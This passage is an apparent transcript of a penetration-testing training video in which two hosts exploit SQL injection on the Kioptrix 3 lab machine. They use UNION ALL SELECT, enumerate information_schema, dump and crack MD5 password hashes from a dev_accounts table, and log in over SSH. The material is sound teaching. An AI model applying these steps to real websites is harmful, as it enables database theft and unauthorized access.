00:17:35.690\nDaniel, one, three, or\nfour and what's going on here.\n\n319\n00:17:35.690 --> 00:17:38.800\nI know, it's a little twisty,\nbut you guys will get it.\n\n320\n00:17:38.800 --> 00:17:41.070\nAll right, so here's key objects three.\n\n321\n00:17:41.070 --> 00:17:44.510\nAnd we've got a blog,\nwe've got a login area.\n\n322\n00:17:44.510 --> 00:17:46.320\nDoing our enumeration, perusing.\n\n323\n00:17:46.320 --> 00:17:50.260\nRemember, when you're pen testing,\nthere is no link you don't follow, right?\n\n324\n00:17:50.260 --> 00:17:53.760\nThere is no path,\nno stone you wanna leave unturned.\n\n325\n00:17:53.760 --> 00:17:54.980\nYou follow everything.\n\n326\n00:17:54.980 --> 00:18:00.380\nAnd it did take me quite a while to\nfind an area, cuz I'm looking for\n\n327\n00:18:00.380 --> 00:18:06.080\nSQL injection, and\nall the stuff seem to be SQL problems.\n\n328\n00:18:06.080 --> 00:18:10.130\nThere were other things that caught my\neye, but I'm looking specifically for SQL.\n\n329\n00:18:10.130 --> 00:18:11.065\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm like,\n\n330\n00:18:11.065 --> 00:18:14.390\nthis thing does not seem to\nhave any real SQL difficulties,\n\n331\n00:18:14.390 --> 00:18:16.595\nat least not from manual enumeration.\n\n332\n00:18:16.595 --> 00:18:17.865\nI could have done something else,\n\n333\n00:18:17.865 --> 00:18:20.575\nrun a vulnerability scanner against it,\nmaybe that would find it for me.\n\n334\n00:18:20.575 --> 00:18:24.245\nBut I'm trying to do it\nthe old fashioned way, right?\n\n335\n00:18:24.245 --> 00:18:24.825\nThe hard way.\n\n336\n00:18:24.825 --> 00:18:29.983\nSo I'm moving around through here, and\nwe get this cut to the chase, see it now.\n\n337\n00:18:29.983 --> 00:18:31.985\nThey're talking about their\nnew revamped website.\n\n338\n00:18:31.985 --> 00:18:34.827\nI click on that, and it takes me\nto do this really cool website,\n\n339\n00:18:34.827 --> 00:18:36.500\nif that's what you wanna call them.\n\n340\n00:18:36.500 --> 00:18:39.510\nGive us a little more,\nI guess this is as low as that goes.\n\n341\n00:18:39.510 --> 00:18:40.620\nWe got these goats,\n\n342\n00:18:40.620 --> 00:18:44.080\nthis handsome young devil right\nhere all decked out to the nines.\n\n343\n00:18:45.400 --> 00:18:46.580\nPictures all over the place.\n\n344\n00:18:47.740 --> 00:18:53.220\nSee over here, our URL is on the gallery,\nso I'm just gonna click on a picture.\n\n345\n00:18:53.220 --> 00:18:54.400\nOf course, I get this guy here.\n\n346\n00:18:56.350 --> 00:18:57.580\nLet's see here, why [INAUDIBLE].\n\n347\n00:18:57.580 --> 00:19:03.610\nI see why, because the web link\nitself is a little messed up.\n\n348\n00:19:03.610 --> 00:19:05.460\nSo I can look at,\nthere we go, show you guys.\n\n349\n00:19:06.460 --> 00:19:08.950\nNotice I'm hovering over the picture and\nit's saying keyoptics3.com.\n\n350\n00:19:08.950 --> 00:19:11.820\nYou know what I'm gonna do to fix that?\n\n351\n00:19:11.820 --> 00:19:15.370\nI'm gonna edit that file,\nthat etsy host file.\n\n352\n00:19:15.370 --> 00:19:21.120\nReally quickly, nano,\ncuz it wants kioptrix3, not kioptrix-3.\n\n353\n00:19:21.120 --> 00:19:22.362\nForgive me, kind sir.\n\n354\n00:19:22.362 --> 00:19:22.880\n&gt;&gt; [LAUGH]\n&gt;&gt; /etc.\n\n355\n00:19:22.880 --> 00:19:28.170\nI was just trying to stay consistent\nwith my naming conventions here, but\n\n356\n00:19:28.170 --> 00:19:29.440\nthey will have none of it.\n\n357\n00:19:29.440 --> 00:19:30.950\nGo in here, change that.\n\n358\n00:19:32.850 --> 00:19:37.380\nThere we go, and then Ctrl+O,\nCtrl+X to save that.\n\n359\n00:19:37.380 --> 00:19:39.780\nNow let's try going to that.\n\n360\n00:19:39.780 --> 00:19:41.420\nThere we go,\nnow things are working correctly.\n\n361\n00:19:42.600 --> 00:19:47.140\nSo I was clicking through here and\nI'm looking at, I tried this ratings area.\n\n362\n00:19:47.140 --> 00:19:48.280\nI thought, maybe that ratings,\n\n363\n00:19:48.280 --> 00:19:52.290\ncuz it's got some cool stuff\nin the URL down here below.\n\n364\n00:19:52.290 --> 00:19:55.310\nIf you guys can see that,\nshowing you all the URL stuff.\n\n365\n00:19:55.310 --> 00:19:59.300\nThis is what was kinda catching my eye,\nthis vote.phpid=3.\n\n366\n00:19:59.300 --> 00:20:01.570\nSomething like that,\n\n367\n00:20:01.570 --> 00:20:04.430\nthat's definitely what you wanna look for,\nthings of that nature.\n\n368\n00:20:05.580 --> 00:20:09.600\nSo I'm gonna click back in, and\nwe'll zoom back out really quickly.\n\n369\n00:20:09.600 --> 00:20:11.910\nWhere was it that I went?\n\n370\n00:20:11.910 --> 00:20:12.800\nI think I, let me go back.\n\n371\n00:20:14.140 --> 00:20:16.640\nI got into one area, this gallery area.\n\n372\n00:20:16.640 --> 00:20:17.760\nHere we go.\n\n373\n00:20:17.760 --> 00:20:22.070\nI was looking through here and\nI noticed the sorting options right here.\n\n374\n00:20:22.070 --> 00:20:25.444\nClicked on that, and\nI just clicked on Photo ID.\n\n375\n00:20:25.444 --> 00:20:29.781\nAnd then when I did that,\nI noticed up here,\n\n376\n00:20:29.781 --> 00:20:34.530\nI got PHP id equals one and sort photo id.\n\n377\n00:20:34.530 --> 00:20:35.630\nThat was what caught my eye,\n\n378\n00:20:35.630 --> 00:20:40.850\nthat was what,\nthat photo id equals something, right?\n\n379\n00:20:40.850 --> 00:20:45.170\nI thought good spot,\nmaybe a SQL injection could be an issue.\n\n380\n00:20:45.170 --> 00:20:46.660\nJust a test, right?\n\n381\n00:20:46.660 --> 00:20:48.360\nThere's no input box here, right?\n\n382\n00:20:48.360 --> 00:20:52.078\nBut there is something going\non there with that id=1.\n\n383\n00:20:52.078 --> 00:20:54.500\nSo I'm just gonna erase that out.\n\n384\n00:20:54.500 --> 00:20:57.560\nAnd I'm just gonna add a semicolon, right?\n\n385\n00:20:57.560 --> 00:21:00.770\nBecause remember,\nsemicolons are used in transact-SQL.\n\n386\n00:21:00.770 --> 00:21:01.666\nSo let's see.\n\n387\n00:21:01.666 --> 00:21:04.240\nI just hit Return, and I get an error.\n\n388\n00:21:04.240 --> 00:21:07.099\nI was like [SOUND] finally,\nI found a good spot!\n\n389\n00:21:07.099 --> 00:21:11.709\nYou have an error in your SQL syntax, so\nwe're getting errors from the machine.\n\n390\n00:21:13.280 --> 00:21:15.060\nCorresponds to your SQL server, and\n\n391\n00:21:15.060 --> 00:21:18.020\nit tells you where the error\nis in here and all that.\n\n392\n00:21:18.020 --> 00:21:18.700\nThat's good for me.\n\n393\n00:21:18.700 --> 00:21:23.770\nNow I know,\nlet's try hitting it with some actual SQL.\n\n394\n00:21:23.770 --> 00:21:25.290\nSo I'm gonna take that out.\n\n395\n00:21:26.570 --> 00:21:29.580\nNow I'm gonna try using an order.\n\n396\n00:21:29.580 --> 00:21:32.210\nNow, if I didn't get an error,\nthat doesn't mean I'm out of the game.\n\n397\n00:21:32.210 --> 00:21:35.090\nIt just means I gotta try\na different technique, right?\n\n398\n00:21:35.090 --> 00:21:37.950\nAnd then, if that technique doesn't work,\nthen I'm out of the game, right?\n\n399\n00:21:37.950 --> 00:21:41.720\nThen SQL injection's not gonna\nbe my platform of attack.\n\n400\n00:21:41.720 --> 00:21:44.550\nWe would try blind SQL injection,\nwhich we're gonna get to.\n\n401\n00:21:44.550 --> 00:21:48.670\nSo if that didn't work, I will show you\nhow to continue testing, all right?\n\n402\n00:21:48.670 --> 00:21:50.750\nBut for here, we do, we get errors.\n\n403\n00:21:50.750 --> 00:21:53.790\nSo I can get responses\nfrom the SQL Server.\n\n404\n00:21:53.790 --> 00:21:59.672\nI'm gonna try order by, and\nthen I'll just say 1--, like that.\n\n405\n00:21:59.672 --> 00:22:03.310\nThat dash is basically like\neverything after this is a comment.\n\n406\n00:22:04.390 --> 00:22:06.570\nSo hit Return, and\nyou guys know SQL, right?\n\n407\n00:22:06.570 --> 00:22:07.160\nYou guys are SQLs.\n\n408\n00:22:08.320 --> 00:22:11.060\nYou'll notice that I got no errors.\n\n409\n00:22:12.290 --> 00:22:14.830\nThat means what, Mike?\n\n410\n00:22:14.830 --> 00:22:16.820\n&gt;&gt; That means they liked it, it worked.\n\n411\n00:22:16.820 --> 00:22:18.208\n&gt;&gt; That's right, exactly.\n\n412\n00:22:18.208 --> 00:22:21.380\nIf it doesn't get an error, that means\nmy SQL statement went through and\n\n413\n00:22:21.380 --> 00:22:23.380\nit was fine with it,\nit didn't have a problem.\n\n414\n00:22:23.380 --> 00:22:26.130\n&gt;&gt; And I think you did what you did\nthe dash dash, right, on that one?\n\n415\n00:22:26.130 --> 00:22:26.970\n&gt;&gt; Yeah.\n&gt;&gt; Yeah, which is,\n\n416\n00:22:26.970 --> 00:22:30.470\nif you guys know your SQL, as Daniel was\nsaying, comments out everything else.\n\n417\n00:22:30.470 --> 00:22:34.630\nSo you're just saying, hey, here,\nrun this, and then ignore anything else\n\n418\n00:22:34.630 --> 00:22:36.900\nthe website might be adding,\njust ignore it completely.\n\n419\n00:22:36.900 --> 00:22:37.840\n&gt;&gt; That's right.\n\n420\n00:22:37.840 --> 00:22:40.910\nSo, now that we know that we can do that,\nwhat I wanna do is I wanna find out\n\n421\n00:22:40.910 --> 00:22:45.520\nwhere's a good spot for me to actually\nreach into the SQL database and\n\n422\n00:22:45.520 --> 00:22:48.210\npull data out of there so\nthat I can see them?\n\n423\n00:22:48.210 --> 00:22:53.660\nI wanna know where are these tables and\ncolumns occurring in the website?\n\n424\n00:22:53.660 --> 00:22:58.530\nSo we can continue to use our SQL\ninjection to figure those things out.\n\n425\n00:22:58.530 --> 00:23:01.180\nNow, what we'll do is\nwe'll do that by using our\n\n426\n00:23:02.250 --> 00:23:04.340\nUNION ALL SELECT statement, right?\n\n427\n00:23:04.340 --> 00:23:06.740\nSo, UNION ALL, and then SELECT.\n\n428\n00:23:06.740 --> 00:23:10.100\nNow, we do have to find out exactly\nhow many columns there are.\n\n429\n00:23:10.100 --> 00:23:13.740\nWe can't have the wrong amount, we have\nto use the exact amount of columns there.\n\n430\n00:23:13.740 --> 00:23:15.320\nSo we have to do a little bit of testing.\n\n431\n00:23:15.320 --> 00:23:17.640\nLet me show you how to do that.\n\n432\n00:23:17.640 --> 00:23:18.480\nGo back into my URL here.\n\n433\n00:23:18.480 --> 00:23:23.510\nTake my order by out and\ndo union all select.\n\n434\n00:23:24.640 --> 00:23:27.400\nLike that.\nAnd then say one.\n\n435\n00:23:27.400 --> 00:23:27.900\nHit return.\n\n436\n00:23:29.180 --> 00:23:32.590\nHere, I get the you select statement\nhave different number of columns and\n\n437\n00:23:32.590 --> 00:23:33.860\ncould not select the category.\n\n438\n00:23:33.860 --> 00:23:38.190\nSo, the error is actually telling me I\ndidn't use the right number of columns.\n\n439\n00:23:38.190 --> 00:23:39.480\nI need to continue, okay?\n\n440\n00:23:39.480 --> 00:23:42.060\nI'm gonna continue doing that, too.\n\n441\n00:23:42.060 --> 00:23:44.920\nSo I just comma two, no spaces.\n\n442\n00:23:44.920 --> 00:23:45.460\nTry that.\n\n443\n00:23:45.460 --> 00:23:47.693\nStill getting an error.\n\n444\n00:23:47.693 --> 00:23:53.040\nBecause I've done this,\nI will got to 6 and hit Return.\n\n445\n00:23:53.040 --> 00:23:54.661\nNow you see that things are working.\n\n446\n00:23:54.661 --> 00:24:00.348\nI know that there's 6 because when\nI go to 7 I get an error, right?\n\n447\n00:24:00.348 --> 00:24:03.050\nSo if I'm getting an error,\nit's the wrong amount of columns.\n\n448\n00:24:03.050 --> 00:24:05.610\nWhen I hit the right amount of columns,\nI get the website.\n\n449\n00:24:05.610 --> 00:24:12.010\nNot only do I get the website but\nif I go to 6, right 6, there it is.\n\n450\n00:24:12.010 --> 00:24:15.030\nYou'll notice that, instead of\nthe information that was there before,\n\n451\n00:24:15.030 --> 00:24:18.350\nwe get this 2 and 3, right here.\n\n452\n00:24:18.350 --> 00:24:21.340\nI know this says 3, but that's\nan actual number of photos over here.\n\n453\n00:24:21.340 --> 00:24:25.139\nWhat this is doing is it is showing me\nwhere column 2 and column 3 actually are.\n\n454\n00:24:25.139 --> 00:24:28.040\nIt's displaying that information.\n\n455\n00:24:28.040 --> 00:24:31.300\nSo now I know where I can output my info.\n\n456\n00:24:31.300 --> 00:24:32.730\nVery, very cool stuff, right?\n\n457\n00:24:32.730 --> 00:24:34.810\nSo, what can I do with that?\n\n458\n00:24:34.810 --> 00:24:39.190\nBasically, I say in column 2,\nI add some more SQL, right?\n\n459\n00:24:39.190 --> 00:24:40.534\nI can add some more SQL in column 3.\n\n460\n00:24:40.534 --> 00:24:44.850\nSo let's take a look at\nwhat that looks like.\n\n461\n00:24:44.850 --> 00:24:47.071\nLet me make sure I follow my notes here.\n\n462\n00:24:47.071 --> 00:24:48.993\nHate when the notes cut off on a page.\n\n463\n00:24:48.993 --> 00:24:49.980\nIt's always fun.\n\n464\n00:24:51.340 --> 00:24:52.690\nSo we've gotten through that.\n\n465\n00:24:52.690 --> 00:24:54.590\nWhat are we gonna do next?\n\n466\n00:24:54.590 --> 00:24:56.260\nLet's try the version.\n\n467\n00:24:56.260 --> 00:24:58.160\nWhat version of SQL are we using?\n\n468\n00:24:58.160 --> 00:25:05.140\nSo I can go into my URL and say,\nin column 2, just erase the 2, @@version.\n\n469\n00:25:05.140 --> 00:25:06.660\nLike that.\n\n470\n00:25:06.660 --> 00:25:13.158\nHit Enter, and\nyou'll notice it says 5.0.51a-3Ubuntu5.4.\n\n471\n00:25:13.158 --> 00:25:13.875\nSo pretty cool.\n\n472\n00:25:13.875 --> 00:25:18.588\nI could have put that version in 3, and\nit would have gone in the 3 column.\n\n473\n00:25:18.588 --> 00:25:20.725\nSo, starting to get enumeration, right?\n\n474\n00:25:20.725 --> 00:25:23.319\nWe're still really enumerating the box.\n\n475\n00:25:24.380 --> 00:25:26.100\nLet's see here.\n\n476\n00:25:26.100 --> 00:25:27.020\nMoving on down the pipe.\n\n477\n00:25:29.220 --> 00:25:31.650\nLet's see who we're running as.\n\n478\n00:25:31.650 --> 00:25:32.569\nWho's the user?\n\n479\n00:25:32.569 --> 00:25:34.470\nLet's try that.\n\n480\n00:25:35.730 --> 00:25:37.581\nUser, I think it's like that, is it?\n\n481\n00:25:37.581 --> 00:25:38.098\nIs that correct?\n\n482\n00:25:38.098 --> 00:25:38.982\nYeah, there we go.\n\n483\n00:25:38.982 --> 00:25:39.718\nRoot at local.\n\n484\n00:25:39.718 --> 00:25:40.568\nWell, so that's interesting.\n\n485\n00:25:40.568 --> 00:25:44.247\nIt's always a nice thing to know, so\nI'm issuing these statements as root.\n\n486\n00:25:44.247 --> 00:25:46.339\nAt least that's what it says I'm doing.\n\n487\n00:25:47.600 --> 00:25:48.530\nThat's a good sign.\n\n488\n00:25:49.690 --> 00:25:50.810\nNow we need the table enumerate.\n\n489\n00:25:50.810 --> 00:25:56.180\nWe need to find out what tables\nare available to us in this database.\n\n490\n00:25:56.180 --> 00:26:01.103\nSo what I can do, is I can come in\nhere and I can say, what is it?\n\n491\n00:26:01.103 --> 00:26:02.345\nIt is table name, right?\n\n492\n00:26:02.345 --> 00:26:06.260\nTable_name, like so and\n\n493\n00:26:06.260 --> 00:26:12.590\nthen go to the end of that column\nenumeration area and just say from.\n\n494\n00:26:14.260 --> 00:26:17.841\nYeah, from information,\n\n495\n00:26:17.841 --> 00:26:23.452\nI cannot spell mation_schema.tables.\n\n496\n00:26:23.452 --> 00:26:26.300\nLike that, you start looking through here.\n\n497\n00:26:26.300 --> 00:26:29.970\nYou start to see it's giving\nme every one of the tables\n\n498\n00:26:29.970 --> 00:26:32.780\nthat is available in that database.\n\n499\n00:26:32.780 --> 00:26:34.770\nSo we've got columns that's a good one.\n\n500\n00:26:34.770 --> 00:26:36.230\nI definitely want to enumerate that.\n\n501\n00:26:38.370 --> 00:26:41.480\nAll these different things going on here.\n\n502\n00:26:41.480 --> 00:26:47.930\nProfiling, a lot of tables,\nmore tables, table privileges.\n\n503\n00:26:47.930 --> 00:26:50.910\nSo I think that, there's a user table,\nthat's interesting.\n\n504\n00:26:52.080 --> 00:26:53.210\nThis one's actually really tricky.\n\n505\n00:26:53.210 --> 00:26:54.850\nThe person that set this up was devious.\n\n506\n00:26:54.850 --> 00:26:56.517\n&gt;&gt; [LAUGH]\n&gt;&gt; Because they got me, and\n\n507\n00:26:56.517 --> 00:26:57.310\nthey got me good.\n\n508\n00:26:57.310 --> 00:26:59.470\nAnd I'll show you where\nin just a second here.\n\n509\n00:26:59.470 --> 00:27:00.550\nLet's crank forward.\n\n510\n00:27:00.550 --> 00:27:02.990\nNow that we know that table's up,\nlet's do columns.\n\n511\n00:27:02.990 --> 00:27:04.070\nSee the column names.\n\n512\n00:27:06.200 --> 00:27:07.703\nColumns, Daniel.\n\n513\n00:27:07.703 --> 00:27:10.988\nColumn name dot columns.\n\n514\n00:27:15.112 --> 00:27:16.302\nLike so.\n\n515\n00:27:16.302 --> 00:27:21.184\nAnd actually, yeah, and\nI'll say what table because I'll show\n\n516\n00:27:21.184 --> 00:27:25.378\nyou something really funny here,\nlet's just do that.\n\n517\n00:27:25.378 --> 00:27:30.300\nHere's the columns, and\nas I was going through here,\n\n518\n00:27:30.300 --> 00:27:33.836\nI got down to the bottom, where was it?\n\n519\n00:27:33.836 --> 00:27:34.733\nWas it in this one or in tables?\n\n520\n00:27:34.733 --> 00:27:36.940\nThis is a lot of data.\n\n521\n00:27:39.160 --> 00:27:43.220\nBut as I got to the bottom,\nthere were, was it user?\n\n522\n00:27:43.220 --> 00:27:44.590\nYeah, so I had user.\n\n523\n00:27:44.590 --> 00:27:45.608\nI thought that's for user.\n\n524\n00:27:45.608 --> 00:27:49.840\nAnd then there was another one that was,\nI think password.\n\n525\n00:27:49.840 --> 00:27:50.820\n&gt;&gt; Pass maybe?\n\n526\n00:27:50.820 --> 00:27:52.352\n&gt;&gt; Right, let me see, I'm almost there.\n\n527\n00:27:52.352 --> 00:27:53.948\nOoh, I thought I passed it a little bit.\n\n528\n00:27:53.948 --> 00:27:58.823\nOffset, PACKED, PAGE, PAGE, PARAMETER,\n\n529\n00:27:58.823 --> 00:28:02.450\nso it must have been in the tables.\n\n530\n00:28:03.450 --> 00:28:04.220\nSo, there it is.\n\n531\n00:28:04.220 --> 00:28:06.457\nPassword, so I saw user and\npasswords and I thought great,\n\n532\n00:28:06.457 --> 00:28:08.120\nthat's the ones I wanna enumerate.\n\n533\n00:28:08.120 --> 00:28:08.909\nAnd man, did they get me.\n\n534\n00:28:08.909 --> 00:28:09.467\n&gt;&gt; Yeah.\n\n535\n00:28:09.467 --> 00:28:11.830\n&gt;&gt; Cuz nothing was coming out.\n\n536\n00:28:11.830 --> 00:28:15.275\nThere was no data coming in it because\nthere's no stinking data in them.\n\n537\n00:28:15.275 --> 00:28:19.531\n&gt;&gt; [LAUGH]\n&gt;&gt; There's another one called dev\n\n538\n00:28:19.531 --> 00:28:22.685\naccounts up here some ways.\n\n539\n00:28:22.685 --> 00:28:24.700\nThere's a lot of stuff in here.\n\n540\n00:28:24.700 --> 00:28:27.438\nAnyway, there's one called dev accounts,\ntrust me, it's there.\n\n541\n00:28:27.438 --> 00:28:32.010\nAnd then when I went back through it I\nsaid, well what's this dev accounts one?\n\n542\n00:28:32.010 --> 00:28:33.660\nAnd lo and behold,\nwe found some information.\n\n543\n00:28:33.660 --> 00:28:36.330\nSo let me show you that, how to do that.\n\n544\n00:28:36.330 --> 00:28:40.400\nIf I come in here,\nI wanna read that column info.\n\n545\n00:28:40.400 --> 00:28:43.880\nSo it is username and password.\n\n546\n00:28:45.397 --> 00:28:47.860\nSo those exist, so\nI'm gonna use column 2 for username.\n\n547\n00:28:47.860 --> 00:28:53.083\nUsername, and\nthen I'm gonna take 3 out and\n\n548\n00:28:53.083 --> 00:29:00.236\ncall it password cuz those were\ngood columns and good tables.\n\n549\n00:29:00.236 --> 00:29:04.491\nAnd I will say from the table\n\n550\n00:29:04.491 --> 00:29:09.118\ndev_accounts, like that.\n\n551\n00:29:09.118 --> 00:29:12.815\nAnd then once I did that,\nwe now see I've got a username,\n\n552\n00:29:12.815 --> 00:29:17.330\nI've got an encrypted password,\nthat's a hashed password.\n\n553\n00:29:17.330 --> 00:29:20.880\nBut there's two usernames and\npasswords that came out in those fields.\n\n554\n00:29:20.880 --> 00:29:25.048\nI can now copy and paste those, which is\nexactly what I did, if I come here and\n\n555\n00:29:25.048 --> 00:29:25.578\ndo an ls.\n\n556\n00:29:25.578 --> 00:29:30.165\nI got this creds.txt cat creds and\nI just copied them and\n\n557\n00:29:30.165 --> 00:29:35.350\nI shoved them through my password\ncracker and it was md5 hash.\n\n558\n00:29:36.350 --> 00:29:39.800\nThere's online md5 decreptors and\nwe were off to the races.\n\n559\n00:29:40.900 --> 00:29:42.170\nAnd I got those passwords.\n\n560\n00:29:42.170 --> 00:29:48.432\nFrom there, if I do a little endmap,\n\n561\n00:29:48.432 --> 00:29:53.079\nmap of kioptrics3.com,\n\n562\n00:29:53.079 --> 00:29:56.720\nI see the ssh is open.\n\n563\n00:29:58.460 --> 00:30:00.989\nAnd I can try to login with ssh or\n\n564\n00:30:00.989 --> 00:30:06.550\nwe will use that because it uses\nStar Wars, and I like that.\n\n565\n00:30:06.550 --> 00:30:08.498\n&gt;&gt; I knew you would.\n\n566\n00:30:08.498 --> 00:30:14.544\n&gt;&gt; I cannot spell, at kioptrics3.com.\n\n567\n00:30:14.544 --> 00:30:19.694\nThere is his password which is Star Wars\nwhich is all typed on one hand,\n\n568\n00:30:19.694 --> 00:30:20.853\noddly enough.\n\n569\n00:30:20.853 --> 00:30:23.040\n&gt;&gt; [LAUGH]\n&gt;&gt; You don't use your right hand at all.\n\n570\n00:30:23.040 --> 00:30:23.930\nAnd I'm logged in.\n\n571\n00:30:23.930 --> 00:30:30.100\nAnd now I'm set up for a springboard into,\nwe looked at privilege escalation.\n\n572\n00:30:30.100 --> 00:30:31.110\nNot a root user.\n\n573\n00:30:31.110 --> 00:30:32.450\nI didn't try to pseudo anything,\n\n574\n00:30:32.450 --> 00:30:37.920\nbut I assume you'll have\nto in some way from here.\n\n575\n00:30:37.920 --> 00:30:41.810\nTo continue on to root,\nbut I was able to log in.\n\n576\n00:30:41.810 --> 00:30:43.620\nI've got Shell access.\n\n577\n00:30:43.620 --> 00:30:47.460\nI can continue my exploitation from\nthere all using what we learned\n\n578\n00:30:47.460 --> 00:30:49.560\nfrom enumeration through SQL.\n\n579\n00:30:49.560 --> 00:30:51.410\n&gt;&gt; Yeah, that is amazing stuff, Dan.\n\n580\n00:30:51.410 --> 00:30:54.004\nAnd we appreciate those\ngreat demonstrations,\n\n581\n00:30:54.004 --> 00:30:58.560\nreally shows you that with a little bit of\nknowledge of your Transact-SQL language,\n\n582\n00:30:58.560 --> 00:31:02.863\nas a pentester, you can take advantage of\nthe fact that they're not scrubbing or\n\n583\n00:31:02.863 --> 00:31:04.213\nvalidating that input.\n\n584\n00:31:04.213 --> 00:31:08.190\nAllowing those commands to be processed\nby the SQL server in the back end.\n\n585\n00:31:08.190 --> 00:31:12.893\nAnd that's never gonna be a good thing\nwhen you can let random public people fire\n\n586\n00:31:12.893 --> 00:31:16.020\nSQL [LAUGH] commands\nagainst your SQL server.\n\n587\n00:31:16.020 --> 00:31:19.214\nWhen I say SQL, understand I'm not saying\nSQL as in the Microsoft product, right?\n\n588\n00:31:19.214 --> 00:31:23.402\nWe're talking about Transact-SQL\nas a language and SQL,\n\n589\n00:31:23.402 --> 00:31:25.750\nStructure Query Language.\n\n590\n00:31:25.750 --> 00:31:30.011\nAnd just SQL database engines,\nof which Microsoft SQL is one, but\n\n591\n00:31:30.011 --> 00:31:34.653\nthere's also MySQL, and there's\nseveral other free and open source,\n\n592\n00:31:34.653 --> 00:31:39.319\nthat all use that same common language,\nthat Transact-SQL or T-SQL.\n\n593\n00:31:39.319 --> 00:31:44.008\nSo learning that is a big part of being a\ngood pentester, especially if you're gonna\n\n594\n00:31:44.008 --> 00:31:47.520\nwork with command line or\ncommand injection or SQL injection.\n\n595\n00:31:47.520 --> 00:31:51.010\nSo, Daniel, I know we got some\nmore SQL injection to do.\n\n596\n00:31:51.010 --> 00:31:53.994\nBut unfortunately, we are out of time for\nthis particular episode.\n\n597\n00:31:53.994 --> 00:31:55.730\nSo we're gonna have to call it there.\n\n598\n00:31:55.730 --> 00:31:59.910\nWe're gonna leave you hanging and\nwhen we come back with our next part,\n\n599\n00:31:59.910 --> 00:32:03.450\nwe'll finish up or at least\ncontinue on with our SQL injection.\n\n600\n00:32:03.450 --> 00:32:04.320\nSo thank you for that, Daniel.\n\n601\n00:32:04.320 --> 00:32:04.890\n&gt;&gt; No problem.\n\n602\n00:32:04.890 --> 00:32:06.530\n&gt;&gt; Hope everybody out\nthere enjoyed watching.\n\n603\n00:32:06.530 --> 00:32:09.500\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n604\n00:32:09.500 --> 00:32:10.400\n&gt;&gt; I'm Daniel Lowrie.\n\n605\n00:32:10.400 --> 00:32:12.754\n&gt;&gt; And we'll see you next time.\n\n606\n00:32:12.754 --> 00:32:19.070\n[MUSIC]\n\n607\n00:32:19.070 --> 00:32:21.122\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202940388"
        },
        {
          "description": "In this episode, Dan and Mike continue their look into SQL injection. This time they demonstrate how to perform blind SQL injection. They also use sqlmap to automate the process of detecting and exploiting SQL injection flaws.",
          "length": "1580",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-8-1-2-sql_injection_pt2-020317-PGM.00_26_42_17.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-8-1-2-sql_injection_pt2-020317-PGM.00_26_42_17.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-8-1-2-sql_injection_pt2-020317-PGM.00_26_42_17.Still001-sm.jpg",
          "title": "SQL Injection Part 2",
          "transcript": "WEBVTT\n\n1\n00:00:00.008 --> 00:00:01.240\nWelcome to ITPRO.TV.\n\n2\n00:00:01.240 --> 00:00:08.319\nI'm your host [CROSSTALK]\n\n3\n00:00:08.319 --> 00:00:12.630\n&gt;&gt; You're watching ITPRO.TV.\n\n4\n00:00:12.630 --> 00:00:15.780\n&gt;&gt; Hello welcome to another\nexciting episode here at ITPRO.TV.\n\n5\n00:00:15.780 --> 00:00:20.250\nI'm your host, Mike Rodrick and\ntoday we're doing penetration testing and\n\n6\n00:00:20.250 --> 00:00:24.000\nin this episode, we're gonna be\ncontinuing our look at SQL injection,\n\n7\n00:00:24.000 --> 00:00:25.800\ncuz we've got a little bit more to do.\n\n8\n00:00:25.800 --> 00:00:31.470\nSo here to guide us along through\nour SQL injection exploration is Mr.\n\n9\n00:00:31.470 --> 00:00:32.050\nDaniel Lowrie.\n\n10\n00:00:32.050 --> 00:00:32.780\nWelcome back, Daniel.\n\n11\n00:00:32.780 --> 00:00:33.780\n&gt;&gt; I'm so glad to be back.\n\n12\n00:00:33.780 --> 00:00:37.190\nYeah, we kinda had a little bit more to\ntalk about when it comes to SQL injection.\n\n13\n00:00:37.190 --> 00:00:39.060\nEven though we showed you\nsome really cool stuff.\n\n14\n00:00:39.060 --> 00:00:41.200\nOr at least I hope you think\nit was really cool stuff.\n\n15\n00:00:41.200 --> 00:00:42.170\n&gt;&gt; I did.\n\n16\n00:00:42.170 --> 00:00:44.510\n&gt;&gt; Being able to grab usernames and\n\n17\n00:00:44.510 --> 00:00:49.850\npasswords out of a database that's\n&gt;&gt; Being fronted by a web front end,\n\n18\n00:00:49.850 --> 00:00:51.730\nthat could be interesting.\n\n19\n00:00:51.730 --> 00:00:54.570\n&gt;&gt; And the scary thing is\nmost organizations nowadays,\n\n20\n00:00:54.570 --> 00:00:59.650\njust about every website that you go to,\nis dynamic, it can load up content.\n\n21\n00:00:59.650 --> 00:01:04.370\nAnd they've got some kind of database back\nin, and in those databases they're storing\n\n22\n00:01:04.370 --> 00:01:07.560\nall kinds of information that\nthe website needs to build, right?\n\n23\n00:01:07.560 --> 00:01:12.970\nProduct information, prices,\n&gt;&gt; Customer names, email addresses,\n\n24\n00:01:12.970 --> 00:01:16.500\ncredit card information of they've\nchosen to say that with the website so.\n\n25\n00:01:16.500 --> 00:01:18.210\nThere's a lot of juicy information and\n\n26\n00:01:18.210 --> 00:01:20.320\nthere so either if you can't\ntake over the machines.\n\n27\n00:01:20.320 --> 00:01:22.220\nJust the SQL injection\nbeing able to get access\n\n28\n00:01:22.220 --> 00:01:23.390\n&gt;&gt; To that data.\n\n29\n00:01:23.390 --> 00:01:24.180\nIs dangerous enough.\n\n30\n00:01:24.180 --> 00:01:25.180\n&gt;&gt; Yeah, that's exactly right.\n\n31\n00:01:25.180 --> 00:01:29.920\nSo you gotta make sure to sanitize\nyour table, sanitize your input,\n\n32\n00:01:29.920 --> 00:01:35.200\nmake sure that what gets actually run by\nSQL is what's supposed to be run by SQL.\n\n33\n00:01:35.200 --> 00:01:38.610\nThat's the whole purpose of us testing\nthese things and trying to find them.\n\n34\n00:01:38.610 --> 00:01:42.106\nAnd, remember, like we always like to say,\ndon't try this at home, kids.\n\n35\n00:01:42.106 --> 00:01:44.050\n&gt;&gt; [LAUGH]\n&gt;&gt; Well, actually try it at home,\n\n36\n00:01:44.050 --> 00:01:48.720\njust not against machines that you don't\neither have full authorized access to, or\n\n37\n00:01:48.720 --> 00:01:51.010\nthat you own personally.\n\n38\n00:01:51.010 --> 